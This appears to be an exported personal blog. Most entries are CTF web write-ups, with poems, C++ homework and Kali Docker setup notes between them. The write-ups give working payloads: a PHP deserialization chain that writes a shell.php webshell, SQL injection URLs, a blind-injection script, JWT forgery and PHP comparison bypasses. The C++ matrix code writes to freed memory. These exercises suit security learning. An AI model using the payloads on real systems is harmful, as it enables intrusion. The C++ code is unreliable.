$profile=cookie('user'); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); profile中存在魔术方法get和call，当访问不存在的变量或私有变量时调用get(),在对象中调用一个不可访问方法或私有方法时调用call()。123456789101112public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; 继续阅读源码，在Register中发现析构函数调用了checker的index()函数，而Profile中不存在，所以我们就可以反序列化传入一个Register对象，Register的checker成员变量是Profile对象，这样就能触发call和get方法了。再调用Profile中的upload_img()，通过控制成员变量，可以控制执行copy函数就能成功生成图马。123456public function __destruct() &#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125; &#125; 首先先上传一个图马，获取到图片地址再利用payload序列化并base64编码再传入cookie访问，成功upload图马。payload如下123456789101112131415161718192021222324&lt;?phpnamespace app\web\controller;class Profile&#123; public $checker; public $filename_tmp="../public/upload/.../...";//图片路径 public $filename="../public/upload/.../shell.php"; public $upload_menu; public $ext=1; public $img; public $except=array('index'=&gt;'upload_img');&#125;class Register&#123; public $checker; public $registed=0;&#125;$a=new Register();$a-&gt;checker=new Profile();$a-&gt;checker-&gt;checker = 0;echo base64_encode(serialize($a));]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iscc2019 web wp]]></title>
    <url>%2F2019%2F05%2F22%2Fiscc2019-web-wp%2F</url>
    <content type="text"><![CDATA[web1这个涨姿势，chr()函数是模256，在原数加256即可绕过，intval可以用科学计数法绕过，payload如下1password=2e5&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313 web2这题拿到了一血，因为我一发入魂，直接猜到996，果然ctf需要一点脑洞（联系到之前的996事件）。可以用burp，删除cookie和user_code就能暴力破解过验证码了。 web3这题是sql-libs原题，二次注入。 web4 parse_str()把查询字符串解析到变量中,存在变量覆盖，payload如下1action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b web5首先说我们不是Union.373组织成员，推测是改user-agent，果然，接着又让我们输入用户名和密码，post提交username和password，得到提示组织成员密码即为flag。此题为union盲注，参考下大佬的教程http://wonderkun.cc/index.html/?p=547先得到username1username=&apos; or 1 union select 1,2,3 &amp;password=&apos;1 然后改脚本就能爆出flag12345678910111213141516171819import requestsdef getPassword(): url="http://39.100.83.188:8054/" username="union_373_Tom' union distinct select 1,2,0x&#123;&#125; order by 3,'0" flag="" for _ in range(32): for i in range(48,120): headers=&#123;"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Union.373"&#125; data =&#123;"username":username.format((flag+chr(i)).encode('hex')),"password":'1'&#125; res = requests.post(url,data=data,headers=headers) res.encoding='utf-8' if "union_373_Tom" in res.text: flag= flag+chr(i-1) print flag break if __name__== '__main__': getPassword() web6第一次遇到这种jwt题，参考教程https://zhuanlan.zhihu.com/p/37305980首先看到Sources里commom.js，我的用户名是chenxiyuan123456function getpubkey()&#123; /* get the pubkey for test /pubkey/&#123;md5(username+password)&#125; */&#125; 访问拿到自己的pubkey，写脚本构造jwt1234567import jwtimport base64public="-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----"print(jwt.encode(&#123;"name": "chenxiyuan","priv": "admin"&#125;, key=public, algorithm='HS256'))"""b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiY2hlbnhpeXVhbiIsInByaXYiOiJhZG1pbiJ9.3tR0nOjSaz701Z42jmUVRsToZBLy_S-8VoMXktVFQBk'""" 携带新的jwt访问list，得到admin信息访问text/admin:22f1e0aa7a31422ad63480aa27711277，得到flag]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[诗]]></title>
    <url>%2F2019%2F05%2F21%2F%E8%AF%97%2F</url>
    <content type="text"><![CDATA[这个学期上了李雷老师的诗词写作与鉴赏任选课，总归是有收获的。贴出来几首自己感觉还行的诗。鹳雀楼雄伟镇中州，三朝暗淡收。而今强复起，屹立更千秋。 踏青西郊院外花争艳，千万红黄聚簇开。惊诧清香何处觅，池莲衣素送风来。 赠友人风流如我辈，分袂亦欣然。草甸观星笑，茅庐试弈谈。啸歌传四海，吟咏共婵娟。会有重逢日，飞花再纵欢。 春夜闲适有感庭前闲扫晚飞樱，又见嫣红轻舞盈。身惹霞阵全不厌，抬头更看两三星。 咏于谦为立生民命，功争日月光。先生冤惨死，黯淡九州伤。 记语文老师腰柳亭如立，蹁跹步送春。飘然温细语，引我入知门。 念奴娇仰观中条，尽峰峦逼仄，连冈叠嶂。飞瀑腾冲平断壁，天际远衔横浪。漫步山间，绝巘怪柏，惊有千般样。穿石风瑟，黯然伤过往。倭寇谋略中原，欲从此入，好个修罗场。火炮纷飞砸裂谷，鲜血浸染残阳。也持剑护，杀贼三万，再把黄河唱。乘龙直上，斩碎一切虚妄。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>诗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[c++多态性]]></title>
    <url>%2F2019%2F05%2F13%2Fc-%E5%A4%9A%E6%80%81%E6%80%A7%2F</url>
    <content type="text"><![CDATA[南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。1定义复数类Complex，有实部、虚部两个私有成员变量，在该类中定义多个重载的构造函数、定义析构函数和输出函数print，复数的输出形如12-3i，在类中重载+、−、*、/、++（分前++和后++）。在主函数（直接用实验教材P210代码）中定义复数类的对象，实现复数的各种算术运算，通过重载实现静态多态性。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;iostream&gt;#include &lt;string.h&gt;using namespace std;class Complex&#123; private: float real; float imag; public: Complex(float r=0,float i=0); void print(); friend Complex operator + (const Complex &amp;a,const Complex &amp;b); friend Complex operator - (const Complex &amp;a,const Complex &amp;b); friend Complex operator ++ (Complex &amp;a); Complex operator ++ (int); Complex operator * (const Complex &amp;b); Complex operator / (const Complex &amp;b);&#125;;Complex::Complex(float r,float i)&#123; real=r; imag=i;&#125;void Complex::print()&#123; cout&lt;&lt;real; if(imag!=0) &#123; if(imag&gt;0)cout&lt;&lt;"+";cout&lt;&lt;imag&lt;&lt;"i"; &#125; cout&lt;&lt;endl;&#125;Complex operator + (const Complex &amp;a,const Complex &amp;b)&#123; Complex temp; temp.real=a.real+b.real; temp.imag=a.imag+b.imag; return temp;&#125;Complex operator - (const Complex &amp;a,const Complex &amp;b)&#123; Complex temp; temp.real=a.real-b.real; temp.imag=a.imag-b.imag; return temp;&#125;Complex operator ++(Complex &amp;a)&#123; ++a.real; ++a.imag; return a;&#125;Complex Complex::operator ++ (int)&#123; Complex temp(*this); real++; imag++; return temp;&#125;Complex Complex::operator * (const Complex &amp;b)&#123; Complex temp; temp.real=this-&gt;real*b.real-this-&gt;imag*b.imag; temp.imag=this-&gt;real*b.imag+this-&gt;imag*b.real; return temp; &#125;Complex Complex::operator / (const Complex &amp;b)&#123; Complex temp; temp.real=(this-&gt;real*b.real+this-&gt;imag*b.imag)/(b.real*b.real+b.imag*b.imag); temp.imag=(this-&gt;imag*b.real-this-&gt;real*b.imag)/(b.real*b.real+b.imag*b.imag); return temp;&#125;int main()&#123; Complex A1(2.3,4.6),A2(3.6,2.8); Complex A3,A4,A5,A6; A3=A1+A2; A4=A1-A2; A5=A1*A2; A6=A1/A2; cout&lt;&lt;"A1="; A1.print(); cout&lt;&lt;endl&lt;&lt;"A2="; A2.print(); cout&lt;&lt;endl&lt;&lt;"A3=A1+A2="; A3.print(); cout&lt;&lt;endl&lt;&lt;"A4=A1-A2="; A4.print(); cout&lt;&lt;endl&lt;&lt;"A5=A1*A2="; A5.print(); cout&lt;&lt;endl&lt;&lt;"A6=A1/A2="; A6.print(); A3=++A1; cout&lt;&lt;endl&lt;&lt;"after A3=++A1"; cout&lt;&lt;"A1="; A1.print(); cout&lt;&lt;"A3="; A3.print(); A4=A2++; cout&lt;&lt;endl&lt;&lt;"after A4=A2++"; cout&lt;&lt;"A2="; A2.print(); cout&lt;&lt;"A4="; A4.print(); return 0; &#125; 2设计一个矩阵类，要求矩阵类中重载运算符加（＋）和赋值（＝），主函数定义类对象并调用重载的运算符。 提示： (1) 本题考虑可加（即加与被加矩阵的行列数必须分别相等）和可赋值（等号左值的行列数变为右值的行列数）情况，其他情况输出“ program terminated! ”(2) 要求分别输入矩阵 am 和 bm 的行列数，各矩阵元素，分别计算 cm=am+bm;am=bm; 并进行输出(3) 定义相应的构造函数和析构函数(4) 类中的成员变量应当有三个：int row,co请动态空间，存放row*col个整数(5) 程l;分别表示矩阵的行数和列数，另外还需要定义一个一级指针或二级指针用来申序最前面的文件包含请用下面代码： #include #include &lt;stdlib.h&gt;using namespace std;(6)main()已给出，请直接复制使用123456789101112131415161718192021int main()&#123; int row_a,col_a,row_b,col_b; cout&lt;&lt;"请输入am矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_a&gt;&gt;col_a; Matrix am(row_a,col_a); cout&lt;&lt;"请输入bm矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_b&gt;&gt;col_b; Matrix bm(row_b,col_b),cm; cout&lt;&lt;"am:"&lt;&lt;endl; am.disp(); cout&lt;&lt;"bm:"&lt;&lt;endl; bm.disp(); cm=am+bm; cout&lt;&lt;"cm=am+bm:"&lt;&lt;endl; cm.disp(); am=bm; cout&lt;&lt;"am=bm:"&lt;&lt;endl; am.disp(); return 0;&#125; (7)类的成员函数disp的代码已给出，请直接复制使用：12345678910void Matrix::disp()&#123; for(int i=0;i&lt;row;i++) &#123; cout&lt;&lt;'\t'; for(int j=0;j&lt;col;j++) cout&lt;&lt;*(m+i*col+j)&lt;&lt;'\t'; cout&lt;&lt;endl; &#125;&#125; 最后代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;iostream&gt;#include &lt;stdlib.h&gt;using namespace std;class Matrix&#123; private: int *m; int row; int col; public: Matrix(int r=0,int c=0) &#123; row=r; col=c; m= new int[row*col]; if(row!=0&amp;&amp;col!=0) &#123; cout&lt;&lt;"请输入该矩阵元素:" &lt;&lt;endl; for (int i=0;i&lt;r*c;i++) &#123; cin&gt;&gt;*(m+i); &#125; &#125; &#125; ~Matrix() &#123; delete [] m; &#125; void disp() &#123; for(int i=0;i&lt;row;i++) &#123; cout&lt;&lt;'\t'; for(int j=0;j&lt;col;j++) cout&lt;&lt;*(m+i*col+j)&lt;&lt;'\t'; cout&lt;&lt;endl; &#125; &#125; friend Matrix operator + ( const Matrix &amp;A, const Matrix &amp;B); Matrix &amp; operator = (const Matrix &amp;B) &#123; if((this-&gt;row==0)&amp;&amp;(this-&gt;col==0))//用来判断cm=am+bm这种情形 &#123; this-&gt;row=B.row; this-&gt;col=B.col; m= new int[row*col]; for(int i=0;i&lt;(B.row*B.col);i++) &#123; this-&gt;m[i]=B.m[i]; &#125; &#125; if(((this-&gt;row==B.row)&amp;&amp;(this-&gt;col==B.col)))//判断am=bm这种情形 &#123; delete [] m; for(int i=0;i&lt;(B.row*B.col);i++) &#123; this-&gt;m[i]=B.m[i]; &#125; &#125; else &#123; cout&lt;&lt;"program terminated!"&lt;&lt;endl; exit(0); &#125; &#125; &#125;;Matrix operator +(const Matrix&amp; A,const Matrix&amp; B)&#123; Matrix C; if((A.row==B.row)&amp;&amp;(A.col==B.col)) &#123; C.row=A.row; C.col=A.col; C.m=new int[(C.row*C.col)]; for(int i=0;i&lt;(A.row*A.col);i++) &#123; C.m[i]=A.m[i]+B.m[i]; &#125; &#125; else &#123; cout&lt;&lt;"program terminated!"&lt;&lt;endl; exit(0); &#125; return C;&#125;int main()&#123; int row_a,col_a,row_b,col_b; cout&lt;&lt;"请输入am矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_a&gt;&gt;col_a; Matrix am(row_a,col_a); cout&lt;&lt;"请输入bm矩阵的行数和列数:"&lt;&lt;endl; cin&gt;&gt;row_b&gt;&gt;col_b; Matrix bm(row_b,col_b),cm; cout&lt;&lt;"am:"&lt;&lt;endl; am.disp(); cout&lt;&lt;"bm:"&lt;&lt;endl; bm.disp(); cm=am+bm; cout&lt;&lt;"cm=am+bm:"&lt;&lt;endl; cm.disp(); am=bm; cout&lt;&lt;"am=bm:"&lt;&lt;endl; am.disp(); return 0;&#125;]]></content>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单的代码审计]]></title>
    <url>%2F2019%2F04%2F25%2F%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[bugku里一些简单的代码审计题extract变量覆盖http://123.206.87.240:9009/1.php12345678910111213141516&lt;?php$flag='xxx';extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; 首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。 1payload:shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php12345678910 &lt;?php $flag = "flag&#123;xxxxx&#125;"; if (isset($_GET['a'])) &#123; if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; &#125;?&gt; 在5.3之前的php中,strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制. 1payload:a[]=1 urldecode二次编码绕过http://123.206.87.240:9009/10.php12345678910111213141516171819202122&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123;echo("not allowed!");exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123;echo "Access granted!";echo "flag";&#125;?&gt; (PHP 4, PHP 5)eregi函数以不区分大小写的正则表达式匹配，我们只要利用两次urldecode第一次是浏览器的解码第二次是函数的解码，就可以绕过了。这里只对其中一个字符D编码两次就行了，由于D的ascii码16进制值为0x44，所以第一次urlencode是%44，第二次%2544。1payload:id=hacker%2544J md5()函数http://123.206.87.240:9009/18.php123456789101112&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; 这是一道很经典的题了，两变量值不等MD5值相等，利用MD5对数组返回NULL，即可绕过。1payload:username[]=1&amp;password[]=2 数组返回NULL绕过http://123.206.87.240:9009/19.php123456789101112&lt;?php$flag = "flag";if (isset ($_GET['password'])) &#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; 看到题目就知道要，传数组进去了，两次返回都是NULL，不等于FALSE绕过成功。还有可以正常利用ereg遇到%00就截止来绕过。1payload: password[]=1或password=a%00-- 弱类型整数大小比较绕过http://123.206.87.240:9009/22.php1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric() 函数用于检测变量是否为数字或数字字符串。可以用数组绕过，也可以在数字后跟任意符号或文本绕过。1payload: password[]=1或password=1367$ sha()函数比较绕过http://123.206.87.240:9009/7.php123456789101112131415161718192021222324252627282930&lt;?php$flag = "flag";if (isset($_GET['name']) and isset($_GET['password']))&#123;var_dump($_GET['name']);echo "";var_dump($_GET['password']);var_dump(sha1($_GET['name']));var_dump(sha1($_GET['password']));if ($_GET['name'] == $_GET['password'])echo 'Your password can not be your name!';else if (sha1($_GET['name']) === sha1($_GET['password']))die('Flag: '.$flag);elseecho 'Invalid password.';&#125;elseecho 'Login first!';?&gt; 数组绕过,sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立，获得flag。1payload: name[]=1&amp;password[]=2 md5加密相等绕过http://123.206.87.240:9009/13.php123456789101112&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;echo "flag&#123;*&#125;";&#125; else &#123;echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 由于php对数据的处理问题，当它读到0exxx的时候会当做科学计数法来处理。无论0e后面是什么，0的多少次方还是0.md5(QNKCDZO)=0e830400451993494058024219903391md5(240610708)=0e4620974319065090195629887368541payload: a=240610708 十六进制与数字比较http://123.206.87.240:9009/20.php12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = 'flag&#123;test&#125;';$one = ord('1'); //ord — 返回字符的 ASCII 码值$nine = ord('9'); //ord — 返回字符的 ASCII 码值$number = '3735929054';// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return "flase";&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET['password'];echo noother_says_correct($temp);?&gt; 根据题目提示，把3735929054转为16进制0xdeadc0de，发现刚好绕过。1payload: password=0xdeadc0de ereg正则%00截断http://123.206.87.240:9009/5.php1234567891011121314151617181920212223242526272829303132333435&lt;?php$flag = "xxx";if (isset ($_GET['password']))&#123;if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)&#123;echo 'You password must be alphanumeric';&#125;else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)&#123;if (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置&#123;die('Flag: ' . $flag);&#125;else&#123;echo('- have not been found');&#125;&#125;else&#123;echo 'Invalid password';&#125;&#125;?&gt; 科学计数法+%00截断绕过ereg,%00算一个字符。还有就是数组也可以绕过。。。1payload: password=1e9%00*-* 或password[]=1 strpos数组绕过http://123.206.87.240:9009/15.php1234567891011&lt;?php$flag = "flag";if (isset ($_GET['ctf'])) &#123;if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)echo '必须输入数字才行';else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)die('Flag: '.$flag);elseecho '骚年，继续努力吧啊~';&#125;?&gt; 两个函数遇见数组都返回NULL，就都绕过了。1payload: ctf[]=1]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web安全</tag>
        <tag>代码审计</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali安装docker]]></title>
    <url>%2F2019%2F04%2F19%2Fkali%E5%AE%89%E8%A3%85docker%2F</url>
    <content type="text"><![CDATA[第一步123456apt-get updateapt-get install -y apt-transport-https ca-certificatesapt-get install dirmngr 第二步123456apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Decho &apos;deb https://apt.dockerproject.org/repo debian-stretch main&apos; &gt; /etc/apt/sources.list.d/docker.list 第三步1234apt-get updateapt-get install docker-engine 使用aliyun镜像我之前下载速度就像一滴一滴，还经常断掉，使用了阿里云镜像后，就像水管一样，一下就好了。阿里云镜像加速器]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[西湖论剑2019]]></title>
    <url>%2F2019%2F04%2F07%2F%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019%2F</url>
    <content type="text"><![CDATA[CRYPTO哈夫曼之谜123456789101111000111000001010010010101100110110101111101110101011110111111100001000110010110101111001101110001000110a:4d:9g:1f:5l:10:75:9&#123;:1&#125;:1 123456import huffmanimport collectionst1=huffman.codebook([('a', 4), ('d', 9), ('g', 1), ('f', 5),('l', 1),('0', 7),('5', 9),('&#123;', 1),('&#125;', 1)])print(t1)#&#123;'a': '000', 'd': '10', 'g': '00100', 'f': '110', 'l': '00101', '0': '111', '5': '01', '&#123;': '00111', '&#125;': '00110'&#125;#得到f&#123;algddf5dfd0f05550500a5af55dd0d5d0ad&#125;，权重一样的位置可以交换，最后提交ddf5dfd0f05550500a5af55dd0d5d0ad成功 #babyt3http://ctf1.linkedbyx.com:10300首页发现是任意文件读取，然后又看到hint，base64解码得到dir.php,然后用php伪协议读取dir.php，再base64解码payload:1http://ctf1.linkedbyx.com:10300/?file=php://filter/read=convert.base64-encode/resource=dir.php 得到源码123456&lt;?php$a = @$_GET['dir'];if(!$a)&#123;$a = '/tmp';&#125;var_dump(scandir($a)); scandir() 函数返回指定目录中的文件和目录的数组,再同级和上级目录都试试，发现上级目录是存在文件的payload：1http://ctf1.linkedbyx.com:10300/dir.php?dir=/.. 返回目录信息1array(25) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(16) &quot;ffffflag_1s_Her4&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(7) &quot;my_init&quot; [14]=&gt; string(10) &quot;my_service&quot; [15]=&gt; string(3) &quot;opt&quot; [16]=&gt; string(4) &quot;proc&quot; [17]=&gt; string(4) &quot;root&quot; [18]=&gt; string(3) &quot;run&quot; [19]=&gt; string(4) &quot;sbin&quot; [20]=&gt; string(3) &quot;srv&quot; [21]=&gt; string(3) &quot;sys&quot; [22]=&gt; string(3) &quot;tmp&quot; [23]=&gt; string(3) &quot;usr&quot; [24]=&gt; string(3) &quot;var&quot; &#125; 发现ffffflag_1s_Her4，再读取就好了，得到flagpayload：1http://ctf1.linkedbyx.com:10300/?file=/ffffflag_1s_Her4]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pragyan CTF19 webwp]]></title>
    <url>%2F2019%2F03%2F10%2FPragyan-CTF19-webwp%2F</url>
    <content type="text"><![CDATA[Cookie Monster 100Do prepare to see cookies lurking everywhere. http://159.89.166.12:13500/12345678910111213141516171819202122import requestsimport hashlibfrom itertools import *import stringflag = []wordlist = string.printables = requests.session()for i in range(40): cookie = s.get('http://159.89.166.12:13500/').cookies['flag'] flag.append(cookie)print (flag)result= []for i in flag: for j in permutations(wordlist,2): guess = "".join(j) md5 = hashlib.md5(guess.encode("utf8")).hexdigest() if md5 ==i: result.append(guess) breakprint (result) Game of Faces 100The Game of Faces, welcomes you. In this era, where AIs generate a lot of faces, we would like you to contribute to the same by uploading your image. Thank you for contributing, to continue. http://159.89.166.12:15000/12把css删掉，发现一个假的提交，得到一个base64，解码得The_scroll_says=the_night_kingVSvalyrian.txt，然后直接访问。。。http://159.89.166.12:15000/the_night_kingVSvalyrian.txt Mandatory PHP 125PHP, PHP everywhere get the flag and earn your points there. http://159.89.166.12:14000/ 12345678910111213141516171819202122232425262728293031&lt;?php include 'flag.php'; highlight_file('index.php'); $a = $_GET["val1"]; $b = $_GET["val2"]; $c = $_GET["val3"]; $d = $_GET["val4"]; if(preg_match('/[^A-Za-z]/', $a)) die('oh my gawd...'); $a=hash("sha256",$a); $a=(log10($a**(0.5)))**2; //传入 $a='pp';会发现 float(INF) phpif($c&gt;0&amp;&amp;$d&gt;0&amp;&amp;$d&gt;$c&amp;&amp;$a==$c*$c+$d*$d) //这里也传入无限大$s1="true"; else die("Bye..."); if($s1==="true") echo $flag1; for($i=1;$i&lt;=10;$i++)&#123; if($b==urldecode($b)) //编码11次 die('duck'); else $b=urldecode($b); &#125; if($b==="WoAHh!") $s2="true"; else die('oops..'); if($s2==="true") echo $flag2; die('end...'); ?&gt; payload: http://159.89.166.12:14000/?val1=pp&amp;val2=WoAHh%2525252525252525252521&amp;val3=1&amp;val4=100000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000]]></content>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku速度要快wp]]></title>
    <url>%2F2018%2F12%2F10%2Fbugku%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%ABwp%2F</url>
    <content type="text"><![CDATA[http://123.206.87.240:8002/web6/这道题我首先在headers里发现flag，base64解码然后提交失败，发现是需要post得到的数据，然后试了半天都不对，结果发现需要post的是两次解码后的得到的数字。。。无语，上代码 1234567891011121314151617import reimport requestsimport base64url='http://123.206.87.240:8002/web6/'s = requests.Session()#创建session对象，保存Cookie值r = s.get(url)'''txt1 = re.search("flag': '(.*?)',",str(r.headers),re.S)txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1.group(1))),re.S)这个是我刚开始绕的弯路,基础功不扎实'''txt1=r.headers['flag']txt2=re.search(".*?: (.*?)'",str(base64.b64decode(txt1)),re.S)flag=base64.b64decode(txt2.group(1))d=&#123;"margin":flag&#125;print(s.post(url,data=d).text)]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nctf打卡题]]></title>
    <url>%2F2018%2F11%2F27%2Fnctf%E6%89%93%E5%8D%A1%E9%A2%98%2F</url>
    <content type="text"><![CDATA[我果真是太菜了，nctf只做出了web签到题和re签到题外加打了一个i wanna，连web的sql注入签到都没有做出来，在看了一位大佬的write up后，感觉收获很多。http://ctfgame.acdxvfsvd.net:20001/首先学到了空格的过滤绕过：1%20 %09 %0a %0b %0c %0d %a0 %00 /**/ () 发现过滤了截断符号%23,#,–+，只要在语句最后在加个单引号使其闭合就可以了，’’空的也可以执行，就不用用注释了。然后大佬提到’必须直接跟在select后。123?id=1'' 查询:select * from user where id='1''' LIMIT0,1 可以?id=1' and 1=1' 查询:select * from users where id='1' and 1=1'' LIMIT 0,1 不可以id=-1' union select 1,2,3' 可以 然后用子查询进行操作,select * from user where id=’-1’ union select (select group_concat(schema_name) from information_schema.schemata),2,3’，这样就行了。1234http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),2,3%27爆数据库名，应该是这个flaaaaaaag数据库。http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=%27flaaaaaaag%27),2,3%27爆表名，f144444444ghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=%27f144444444g%27),2,3%27爆列名，th1s_1s_flaghttp://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0union%a0select%a0(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),2,3%27查询到flag 收获很多。]]></content>
      <categories>
        <category>web安全学习笔记</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11.15]]></title>
    <url>%2F2018%2F11%2F15%2F11-15%2F</url>
    <content type="text"><![CDATA[这几天又开始学前端了，准备和活动室里两个大佬合伙做院科协的网页设计活动，真的很忙呀！！！然后昨天郁师傅推荐了一个上传漏洞的靶场https://github.com/c0ny1/upload-labs，于是我又要学php了，得学会php的代码审计吧！！！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[铺地毯问题]]></title>
    <url>%2F2018%2F11%2F04%2F%E9%93%BA%E5%9C%B0%E6%AF%AF%E9%97%AE%E9%A2%98%2F</url>
